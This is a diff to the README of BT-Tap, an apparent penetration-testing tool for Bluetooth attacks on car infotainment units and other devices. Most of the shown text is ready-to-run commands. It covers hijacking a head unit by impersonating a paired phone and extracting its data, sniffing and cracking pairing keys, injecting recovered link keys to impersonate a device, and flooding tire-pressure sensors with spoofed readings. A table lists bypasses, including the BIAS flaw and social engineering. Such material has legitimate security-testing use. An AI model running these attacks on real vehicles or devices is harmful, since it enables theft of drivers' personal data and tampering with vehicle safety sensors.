@@ -155,13 +155,11 @@ bt-tap/
 └── pyproject.toml
 ```
 
-**34 Python files, ~9,600 lines of code.**
-
 ---
 
 ## Supported Hardware
 
-Any Linux-compatible USB Bluetooth adapter that works with BlueZ. For MAC spoofing, the adapter must support at least one of: `bdaddr`, `spooftooph`, or `btmgmt`. For TPMS attacks: nRF52840 dongle for enhanced BLE sniffing, RTL-SDR/HackRF/USRP B210 for 315/433 MHz traditional TPMS capture via `rtl_433`.
+Any Linux-compatible USB Bluetooth adapter that works with BlueZ. For MAC spoofing, the adapter must support at least one of: `bdaddr`, `spooftooph`, or `btmgmt`. For BLE pairing capture: nRF52840 dongle with Nordic sniffer firmware. For BR/EDR piconet sniffing: USRP B210 SDR with gr-bluetooth. For TPMS: RTL-SDR/HackRF/USRP B210 for 315/433 MHz capture via `rtl_433`.
 
 BT-Tap is designed for automotive IVI systems but works against any Bluetooth Classic device — car head units, aftermarket stereos, speakers, IoT devices, and phones.
 
@@ -212,9 +210,18 @@ sudo apt install bluesnarfer
 sudo apt install rtl-433     # or build from https://github.com/merbanan/rtl_433
 # Requires RTL-SDR dongle ($25), HackRF ($350), or USRP B210 ($1000+)
 
-# For nRF52840 enhanced BLE sniffing
-# Flash nRF Sniffer firmware, install Wireshark plugin
+# For nRF52840 BLE pairing capture
+# Flash nRF Sniffer firmware, install Wireshark extcap plugin
 # https://www.nordicsemi.com/Products/Development-tools/nrf-sniffer-for-bluetooth-le
+pip install nrfutil  # Alternative CLI for nRF52840 sniffer
+
+# For USRP B210 BR/EDR piconet sniffing
+sudo apt install uhd-host libuhd-dev  # UHD drivers
+# gr-bluetooth for real-time BR/EDR decoding (optional):
+# https://github.com/greatscottgadgets/gr-bluetooth
+
+# For BLE/BR/EDR key cracking
+# crackle: https://github.com/mikeryan/crackle
 ```
 
 ### Python
@@ -716,11 +723,6 @@ sudo bt-tap avrcp monitor AA:BB:CC:DD:EE:FF -d 600
 ---
 
 ### TPMS — Tire Pressure Sensor Attacks
-
-Attack BLE-based TPMS sensors and capture traditional 315/433 MHz TPMS via SDR. TPMS sensors are BLE peripherals that broadcast pressure/temperature readings — the vehicle ECU passively listens. Aftermarket BLE TPMS has zero authentication.
-
-**Architecture:** Sensor (BLE peripheral) → advertises → ECU/VCSEC (BLE observer) → CAN bus → IVI display. No direct sensor-to-IVI path exists in production vehicles.
-
 #### BLE TPMS Operations
 
 ```bash
@@ -768,9 +770,7 @@ sudo bt-tap tpms flood -d 60 --mode random --interval 20
 sudo bt-tap tpms flood --mode sweep --position 2 -d 30
 ```
 
-#### 315/433 MHz SDR Capture (Traditional TPMS)
-
-Traditional TPMS uses 315 MHz (North America) or 433.92 MHz (Europe) RF — not Bluetooth. Requires `rtl_433` + RTL-SDR/HackRF/USRP B210.
+#### 315/433 MHz SDR Capture
 
 ```bash
 # Auto-hop between 315M and 433.92M frequencies
@@ -886,7 +886,7 @@ sudo bt-tap -v vulnscan AA:BB:CC:DD:EE:FF
 
 ### Full IVI Hijack
 
-The flagship command: impersonate a phone and extract all data from an IVI in one operation.
+The core command: impersonate a phone and extract all data from an IVI in one operation.
 
 ```bash
 # Full 5-phase hijack
@@ -1149,22 +1149,28 @@ sudo bt-tap tpms sdr -d 60
 sudo bt-tap tpms flood --mode random -d 30
 ```
 
-### Workflow 6: Ubertooth Pairing Capture + Key Cracking
+### Workflow 6: Pairing Capture + Key Cracking (nRF52840 / USRP B210)
 
 ```bash
-# Scan for active piconets (requires Ubertooth One hardware)
-sudo bt-tap recon ubertooth-scan -d 30
+# BLE: Scan for BLE advertisers using nRF52840 dongle
+sudo bt-tap recon nrf-scan -d 30
 
-# Follow target device's piconet and capture to pcap
-sudo bt-tap recon ubertooth-follow AA:BB:CC:DD:EE:FF -o capture.pcap -d 120
+# BLE: Sniff BLE pairing exchange (wait for phone-IVI pairing)
+sudo bt-tap recon nrf-sniff -t AA:BB:CC:DD:EE:FF -o ble_pair.pcap -d 120
 
-# Sniff BLE pairing exchange (wait for phone-IVI pairing)
-sudo bt-tap recon ubertooth-ble -t AA:BB:CC:DD:EE:FF -o ble_pair.pcap -d 120
-
-# Crack BLE pairing key from captured exchange
+# BLE: Crack pairing key from captured exchange
 sudo bt-tap recon crack-key ble_pair.pcap -o decrypted.pcap
 
-# Extract BR/EDR link key from Classic pairing capture
+# BR/EDR: Scan for active piconets using USRP B210
+sudo bt-tap recon usrp-scan -d 30
+
+# BR/EDR: Follow target piconet and capture traffic
+sudo bt-tap recon usrp-follow AA:BB:CC:DD:EE:FF -o capture.pcap -d 120
+
+# BR/EDR: Raw IQ capture for offline analysis with GNU Radio
+sudo bt-tap recon usrp-capture -o raw.iq -d 60 --freq 2441000000
+
+# Extract BR/EDR link key from captured pairing pcap
 sudo bt-tap recon extract-link-key capture.pcap
 
 # Inject recovered key into BlueZ for impersonation
@@ -1202,10 +1208,10 @@ sudo bt-tap fuzz at AA:BB:CC:DD:EE:FF --channel 1 --patterns "long,null,format"
 
 ---
 
-## When Does Hijack Actually Work?
+## When Does Hijack Work?
 
 The core attack (spoof phone MAC → connect to IVI → extract data) depends on the
-IVI's authentication enforcement. Here's an honest breakdown:
+IVI's authentication enforcement.
 
 ### Works (high success probability)
 
@@ -1217,13 +1223,13 @@ IVI's authentication enforcement. Here's an honest breakdown:
 | **Pre-2019 IVI (BT 2.1–4.2)** | Older stacks often skip mutual authentication |
 | **Aftermarket head units** | Pioneer, Kenwood, etc. — typically minimal security |
 | **BIAS-vulnerable IVI (CVE-2020-10135)** | Role-switch bypasses authentication (use `--bias` flag) |
-| **Recovered link key** | Ubertooth capture + crack → inject key → legitimate connection |
+| **Recovered link key** | nRF52840/USRP capture + crack → inject key → legitimate connection |
 
 ### Does NOT work (expected secure behavior)
 
 | Scenario | Why | Workaround |
 |----------|-----|------------|
-| **IVI validates stored link key** | We spoofed the MAC but don't have the 128-bit key | Capture pairing with Ubertooth, crack key, inject |
+| **IVI validates stored link key** | We spoofed the MAC but don't have the 128-bit key | Capture pairing with nRF52840/USRP, crack key, inject |
 | **IVI enforces Secure Connections Only mode** | Rejects legacy auth downgrade | Need actual link key or BIAS via InternalBlue |
 | **BT 5.3+ with mutual auth patches** | Both sides must prove key knowledge | Vendor-specific — test anyway |
 | **IVI requires Numeric Comparison** | 6-digit code must match on both screens | Need physical access or social engineering |
@@ -1238,9 +1244,10 @@ Standard hijack flow:
   IVI → "Prove you know the key" (challenge-response)
   You → ??? (don't have the key) → AUTH FAILURE
 
-With Ubertooth key recovery:
-  Ubertooth → sniff original phone-IVI pairing exchange
-  Crackle/tshark → extract link key from captured LMP frames
+With nRF52840/USRP key recovery:
+  nRF52840 → sniff BLE pairing exchange (BLE targets)
+  USRP B210 → sniff BR/EDR piconet traffic (Classic targets)
+  Crackle/tshark → extract link key from captured frames
   bt-tap → inject recovered key into BlueZ
   You → connect with correct key → SUCCESS
 
@@ -1255,7 +1262,7 @@ With BIAS (CVE-2020-10135):
 
 1. **Always try simple hijack first** — many IVIs don't enforce key validation
 2. **If rejected**, run `bt-tap bias probe` to check BIAS vulnerability
-3. **If BIAS fails**, use Ubertooth to capture the real pairing exchange
+3. **If BIAS fails**, use nRF52840/USRP to capture the real pairing exchange
 4. **Document which scenario** the IVI falls into — this IS the pentest finding
 
 ---
@@ -1364,7 +1371,7 @@ sudo bt-tap adapter list
 | Directory | Files | Purpose |
 |-----------|-------|---------|
 | `bt_tap/core/` | 3 | Adapter mgmt, scanning, MAC spoofing |
-| `bt_tap/recon/` | 7 | SDP, GATT, fingerprint, RFCOMM/L2CAP scan, HCI capture, Ubertooth/Crackle |
+| `bt_tap/recon/` | 7 | SDP, GATT, fingerprint, RFCOMM/L2CAP scan, HCI capture, nRF/USRP sniffer |
 | `bt_tap/attack/` | 14 | PBAP, MAP, HFP, A2DP, AVRCP, OPP, AT, TPMS, BIAS, hijack, auto, vuln, DoS, fuzz |
 | `bt_tap/report/` | 2 | HTML/JSON report generation |
 | `bt_tap/utils/` | 3 | Rich UI output system, BT helpers, interactive prompts |
